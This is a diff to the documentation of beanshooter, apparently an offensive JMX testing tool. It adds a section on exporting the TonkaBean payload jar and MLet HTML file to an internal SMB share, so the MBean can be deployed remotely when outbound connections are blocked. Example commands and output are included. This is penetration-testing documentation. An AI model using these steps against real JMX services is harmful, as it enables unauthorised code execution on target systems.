@@ -27,10 +27,10 @@
     - [serial](#serial)
     - [undeploy](#undeploy)
   + [MBean Operations](#mbean-operations)
-    - [generic](#generic)
+    - [generic](#generic-mbean-operations)
       + [info](#generic-info)
-      + [export](#generic-export)
       + [status](#generic-status)
+      + [export](#generic-export)
       + [deploy](#generic-deploy)
       + [undeploy](#generic-undeploy)
     - [tonka](#tonka)
@@ -397,6 +397,30 @@ The `status` action checks whether the corresponding *MBean* is already availabl
 [qtc@devbox ~]$ beanshooter tonka status 172.17.0.2 9010 
 [+] MBean Status: not deployed
 ```
+
+#### Generic Export
+
+Sometimes it is not possible to serve an *MBean* implementation using *beanshooters* stager server. A common
+scenario is that outbound connections to your local machine are blocked. In these situations, you may want
+to load the *MBean* from another location, like a *SMB* service in the internal network where you have write
+access to.
+
+The `export` action exports the *jar* file implementing the specified *MBean* and a corresponding *MLet HTML*
+document that is required for loading the *MBean* using *MLet*. Assuming you want to serve the *TonkaBean*
+form an *SMB* service listening on `10.10.10.5`, you could use the following commands:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka export --export-dir export --stager-url file:////10.10.10.5/share/
+[+] Exporting MBean jar file: export/tonka-bean-3.0.0-jar-with-dependencies.jar
+[+] Exporting MLet HTML file to: export/index.html
+[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Archive:   tonka-bean-3.0.0-jar-with-dependencies.jar
+[+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
+[+] 	Codebase:  file:////10.10.10.5/share/
+```
+
+Afterwards, you can upload the exported *jar* and the `index.html` file to the *SMB* service and use the *beanshooters*
+deploy action with `--stager-url file:////10.10.10.5/share/index.html`.
 
 #### Generic Deploy
 
